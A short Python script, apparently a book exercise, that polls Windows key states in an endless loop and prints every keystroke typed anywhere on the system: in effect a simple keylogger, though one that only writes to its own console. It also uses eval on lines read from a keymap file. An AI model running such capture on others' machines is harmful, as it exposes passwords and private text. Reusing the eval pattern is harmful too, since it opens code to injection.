import win32api, sys, re

def getKeys():
    keys = ['Reserved'] * 256
    with open("ch10_keymap.txt") as infile:
        for line in infile:
            i, k = line.split()
            i = eval(i)
            keys[i] = k
    return keys

keys = getKeys()
# _caplock
alphabet = re.compile('[a-zA-Z\n]')
while True:
    for code in [3] + list(range(8, 256)):
        status = win32api.GetAsyncKeyState(code)
        if status & 1 == 0:
            continue
        if not alphabet.match(chr(code)):
            print(code, keys[code])
        else:
            print(chr(code),end='')
            sys.stdout.flush()